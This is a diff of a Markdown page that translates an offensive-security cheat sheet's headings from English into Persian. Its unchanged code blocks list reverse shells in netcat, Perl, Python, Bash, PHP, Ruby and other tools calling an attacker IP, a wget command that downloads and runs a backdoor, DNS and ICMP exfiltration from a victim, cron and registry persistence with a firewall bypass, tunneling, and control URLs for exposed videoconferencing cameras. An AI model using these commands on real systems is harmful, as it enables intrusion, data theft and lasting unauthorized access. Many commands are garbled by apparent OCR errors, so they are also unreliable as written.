@@ -1,12 +1,13 @@
 ---
 layout: default
+published: true
 ---
 
-# Tips and Tricks
+# نکات و ترفند ها
 
-## File transfer
+## انتقال فایل
 
-### Ftp trough non-interactive shell
+### انتقال توسط ftp بدون دسترسی مستقیم به شل
 
 ```text
 echo open ip 21 ftp.txt
@@ -18,7 +19,7 @@ echo bye ftp.txt
 ftp -s:ftp.txt
 ```
 
-### Dns transfer on linux
+### انتقال Dns در لینوکس
 
 ```text
 On victim:
@@ -37,7 +38,7 @@ On attacker:
    xxd -r -p received~.txt kefS.pgp
 ```
 
-### Exfil command output on a linux machine over ICMP
+### اجرای دستور exfil و انتقال اطلاعات آن با icmp
 
 ```text
 On victim (never ending 1 liner) :
@@ -51,7 +52,7 @@ tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
 grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
 ```
 
-### Open mail relay
+### باز نمودن mail relay
 
 ```text
 C:\ telnet x.x.x.x 25
@@ -63,28 +64,28 @@ Thank You.
 quit
 ```
 
-## Reverse shells \[1\]\[2\]\[3\]
+## شل معکوس
 
-### Netcat \(\* start listener on attack box to catch shell\)
+### دستور Netcat \(\* اجرا در سیستم مهاجم\)
 
 ```text
 nc 10.0.0.1 1234 -e /bin/sh    Linux reverse shell
 nc 10.0.0.1 1234 -e cmd.exe    Windows reverse shell
 ```
 
-### Netcat \(some versions don't support -e option\)
+### دستور Netcat \(ممکن است در بعضی از نسخه ها -e پشتیبانی نشود\)
 
 ```text
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
-### Netcat  work-around when -e option not possible
+### دستور Netcat  برای موقع هایی که -e پشتیبانی نمی شود
 
 ```text
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
 ```
 
-### Perl
+### زبان Perl
 
 ```text
 perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket(S,PF INET, SOCK STREAM,
@@ -92,7 +93,7 @@ getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
 open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'
 ```
 
-### Perl without /bin/sh
+### زبان Perl بدون نیاز به /bin/sh
 
 ```text
 perl -MIO -e '$p=fork;exit,if($p);$c=new
@@ -100,14 +101,14 @@ IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
 c,w) ;system$_ while ;'
 ```
 
-### Perl for windows
+### زبان Perl برای windows
 
 ```text
 perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
 c,r) ;$~- fdopen($c,w) ;system$_ while ;'
 ```
 
-### Python
+### زبان Python
 
 ```text
 python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET,
@@ -116,13 +117,13 @@ os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-### Bash
+### زبان Bash
 
 ```text
 bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 ```
 
-### Java
+### زبان Java
 
 ```text
 r = Runtime.getRuntime()
@@ -131,20 +132,20 @@ while read line; do \$line 2 &5 &5; done"] as String[])
 p.waitFor()
 ```
 
-### Php
+### زبان Php
 
 ```text
 php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
 ```
 
-### Ruby
+### زبان Ruby
 
 ```text
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
 sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
 ```
 
-### Ruby without /bin/sh
+### زبان Ruby بدون نیاز به /bin/sh
 
 ```text
 by -rsocket -e 'exit if
@@ -152,7 +153,7 @@ fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
 ") {| io|c.print io.read}end'
 ```
 
-### Ruby for windows
+### زبان Ruby برای windows
 
 ```text
 ruby -rsocket -e
@@ -160,7 +161,7 @@ ruby -rsocket -e
 io|c.print io.read}end'
 ```
 
-### Telnet
+### دستور Telnet
 
 ```text
 rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
@@ -168,7 +169,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
 telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
 ```
 
-### Xterm
+### دستور Xterm
 
 ```text
 xterm -displaj 10.0.0.1:1
@@ -176,22 +177,22 @@ o Start Listener: Xnest :1
 o Add permission to connect: xhost +victimiP
 ```
 
-### Misc
+### متفرقه
 
 ```text
 wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
 ```
 
-## Persistence
+## دسترسی همیشگی
 
-### For linux persistence \(on attack box\)
+### برای لینوکس \(در سیستم مهاجم\)
 
 ```text
 crontab -e : set for every 10 min
 0-59/10  nc ip 777 -e /bin/bash
 ```
 
-### Windows  task scheduler persistence \(start task scheduler\)
+### برای ویندوز \(شروع task scheduler\)
 
 ```text
 sc config schedule start= auto
@@ -199,7 +200,7 @@ net start schedule
 at 13:30 ""C:\nc.exe ip 777 -e cmd.exe""
 ```
 
-### Windows persistence backdoor with firewall bypass
+### اجرای backdoor به همراه بایپس فایروال ویندوز
 
 ```text
 1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
@@ -209,7 +210,7 @@ at 13:30 ""C:\nc.exe ip 777 -e cmd.exe""
    "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
 ```
 
-### Remote Payload development via smb or webdav
+### توسعه پیلود در smb یا webdav
 
 ```text
 Via SMB:
@@ -233,15 +234,15 @@ wmic /node: remote ip /user:domain\compromised user //password:password
 process call create "\ \ payload ip \test\msf.exe"
 ```
 
-## Tunneling 
+## تونل 
 
-### Fpipe - listen on 1234 and forward to port 80 on 2.2.2.2
+### Fpipe - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2
 
 ```text
 fpipe.exe -l 1234 -r 80 2.2.2.2
 ```
 
-### Socks.exe - scan intranet trough socks proxy
+### Socks.exe - پویش اینترانت در پروکسی ساکس
 
 ```text
 On redirector (1.1.1.1):
@@ -256,13 +257,13 @@ Scan through socks proxy:
     proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
 ```
 
-### Socat - listen on 1234 and forward to port 80 on 2.2.2.2
+### Socat - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2
 
 ```text
 socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
 ```
 
-### Stunnel - ssl encapsulated nc tunnel \(windows & linux\) \[8\]
+### Stunnel - ssl encapsulated در تونل nc \(ویندوز & لینوکس\) \[8\]
 
 ```text
 On attacker (client):
@@ -284,23 +285,23 @@ On attacker (client):
 # nc -nv 127.0.0.1 5555
 ```
 
-Google hacking
+## نکات جست و جو در google
 
-| **Search Term** | **Description** |
+| **پارامتر** | **توضیح** |
 | :--- | :--- |
-| site: \[url\] | search ony one \[url\] |
-| numrange: \[\#\]...\[\#\] | search within a number range |
-| date: \[ \#\] | search within past \[\#\] months |
-| link: \[url\] | find pages that link to \[url\] |
-| related: \[url\] | find pages related to \[url\] |
-| intitle: \[string\] | find pages with \[string\] in title |
-| inurl: \[string\] | find pages with \[string\] in url |
-| filetjpe: \[xls\] | find files that are xls |
-| phonebook: \[name\] | find phone book listings of \[name\] |
+| site: \[url\] | جست و جو یک سایت \[url\] |
+| numrange: \[\#\]...\[\#\] | جست و جو در محدوده عددی |
+| date: \[ \#\] | جست و جو در یک ماه گذشته |
+| link: \[url\] | جست و جو صفحاتی که دارای آدرس خاصی است |
+| related: \[url\] | جست و جو صفحات مرتبط با آدرس خاص |
+| intitle: \[string\] | جست و جو صفحاتی که دارای عنوان خاصی است |
+| inurl: \[string\] | جست و جو صفحاتی که در url آن دارای آدرس خاصی است|
+| filetjpe: \[xls\] | جست و جو کلیه فایل های با پسوند xls |
+| phonebook: \[name\] | جست و جو کلیه دفترچه تلفن هایی که دارای نام خاص می باشند |
 
-## Video teleconferencing
+## نکات Video teleconferencing
 
-### Polycom
+### برند Polycom
 
 ```text
 telnet ip
@@ -311,16 +312,15 @@ http:// ip /a_security.htm
 http:// ip /a_rc.htm
 ```
 
-### Trandberg
+### برند Trandberg
 
 ```text
 http:// ip /snapctrl.ssi
 ```
 
-### Sony webcam
+### برند Sony webcam
 
 ```text
 http:// ip /commard/visca-gen.cgi?visca= str
 8101046202FF : Freeze Camera
 ```
-
